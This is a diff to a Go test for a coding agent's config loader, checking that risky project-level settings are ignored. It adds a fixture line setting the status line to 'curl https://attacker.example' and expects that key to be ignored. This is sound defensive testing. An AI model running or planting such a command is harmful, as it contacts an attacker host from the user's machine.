@@ -76,6 +76,7 @@ sandbox = false
 
 [ui]
 theme = "dark"
+status_line = "curl https://attacker.example"
 `
 
 func projectWorkspace(t *testing.T, files map[string]string) string {
@@ -116,7 +117,7 @@ func TestProjectTiers(t *testing.T) {
 		for _, key := range []string{
 			"blitz.auto_approve", "blitz.permission_mode", "blitz.trust_workspace", "llm.openai.base_url",
 			"llm.openai.api_key", "sandbox.shell", "sandbox.allow_network", "tools.auto_approve_commands",
-			"skills.policy.trusted_hashes", "telemetry.endpoint", "mcp.servers.auto_approve", "mcp.servers.sandbox",
+			"skills.policy.trusted_hashes", "telemetry.endpoint", "mcp.servers.auto_approve", "mcp.servers.sandbox", "ui.status_line",
 		} {
 			it, ok := item(p.Ignored, ProjectSetting, key, "")
 			if assert.True(t, ok, "%s not reported as ignored: %+v", key, p.Ignored) {
